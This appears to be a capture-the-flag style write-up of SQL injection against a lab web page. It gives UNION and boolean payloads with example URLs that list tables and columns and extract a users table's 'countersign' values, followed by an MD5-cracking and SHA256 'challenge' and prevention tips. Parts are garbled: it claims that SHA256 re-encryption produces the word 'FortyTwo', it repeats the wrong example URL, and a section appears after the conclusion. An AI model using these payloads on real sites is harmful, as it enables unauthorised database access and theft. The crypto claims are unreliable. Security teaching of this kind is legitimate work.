# SQL Injection and Cryptographic Challenge Documentation

## Overview

This document provides a comprehensive guide on identifying and exploiting SQL injection vulnerabilities within a web application. Additionally, it outlines a cryptographic challenge involving MD5 hash decryption and SHA256 re-encryption, aimed at enhancing understanding of cryptographic principles and practices.

## Vulnerability Description

SQL injection vulnerabilities occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application. This document details various types of SQL injection attacks, including table name disclosure, boolean-based SQL injection, column name disclosure, and data extraction, highlighting the potential for unauthorized access to or manipulation of database information.

## Exploitation

### Discovering Database Tables

- **Payload**: `1 UNION SELECT null, table_name FROM information_schema.tables`
- **Purpose**: This payload is used to list all tables within the database.
- **Example URL**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit#

### Checking for Table Existence

- **Payloads**:
- `1 OR 1=1`: This payload is a basic test to change the query logic to always return true.
- `1 OR EXISTS (SELECT * FROM users)`: This payload checks if the `users` table exists by attempting to select records from it.
- **Example URL**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit#

## Extracting Sensitive Data

- **Payload**: `1 OR 1=1 UNION SELECT Commentaire, countersign from users`
- **Purpose**: This payload extracts sensitive data from the `users` table, specifically the `Commentaire` and `countersign` columns.
- **Details**: The `users` table contains columns such as `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, and `countersign`.

## Cryptographic Challenge

- **Task**: Decrypt the `countersign` column values using MD5, convert the plaintext to lowercase, and then re-encrypt using SHA256.
- **Outcome**: The decrypted and re-encrypted value becomes "FortyTwo".

This document outlines the process of identifying and exploiting SQL injection vulnerabilities to discover database schema information and extract sensitive data. Additionally, it includes a cryptographic challenge that demonstrates the process of decrypting and re-encrypting data using different cryptographic algorithms.

### Discovering Column Names

- **Payload**: `1 UNION SELECT table_name, column_name FROM information_schema.columns`
- **Purpose**: This payload is used to list all columns within the database tables.
- **Example URL**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#

## Prevention

- **Parameterized Queries**: Use parameterized queries to prevent SQL injection, as they ensure that the input is treated as a data value rather than part of the SQL command.
- **Input Validation**: Implement strict input validation checks to reject suspicious or malformed data.
- **Use of Prepared Statements**: With prepared statements, the SQL query is defined separately from its parameters, minimizing the risk of injection.
- **Employ Stronger Hashing Algorithms**: Replace MD5 with more secure hashing algorithms like SHA-256 to enhance cryptographic security.
- **Regular Security Audits**: Conduct thorough security audits and penetration testing to identify and mitigate vulnerabilities.

## Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [MD5 Hash Generator and Decrypt](https://md5decrypt.net/en/)
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

This documentation aims to raise awareness about the critical nature of SQL injection vulnerabilities and the importance of cryptographic security in modern web applications. By understanding and applying the outlined prevention techniques, developers and security professionals can significantly enhance the security posture of their applications.
